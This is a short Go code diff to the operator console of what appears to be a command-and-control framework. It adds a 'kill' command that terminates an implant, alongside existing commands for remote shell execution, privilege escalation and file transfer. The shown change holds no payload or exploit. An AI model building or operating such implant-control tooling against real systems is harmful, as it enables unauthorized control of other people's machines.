@@ -1673,6 +1673,14 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			if err := is.executeGetSystem(sessionID); err != nil {
 				fmt.Printf("[!] Error: %v\n", err)
 			}
+		case "kill", "k":
+			if err := is.executeKill(sessionID); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
+			} else {
+				// Session will be terminated, exit the shell
+				is.currentSession = ""
+				return nil
+			}
 		case "help", "h", "?":
 			fmt.Println("Session commands:")
 			fmt.Println("  shell <command>  - Execute shell command")
@@ -1687,6 +1695,7 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			fmt.Println("  cat <path>       - Display file contents")
 			fmt.Println("  download <path> - Download file")
 			fmt.Println("  upload <local> <remote> - Upload file")
+			fmt.Println("  kill, k          - Kill implant and exit session")
 			fmt.Println("  back, exit       - Exit session")
 		default:
 			// Default to shell command
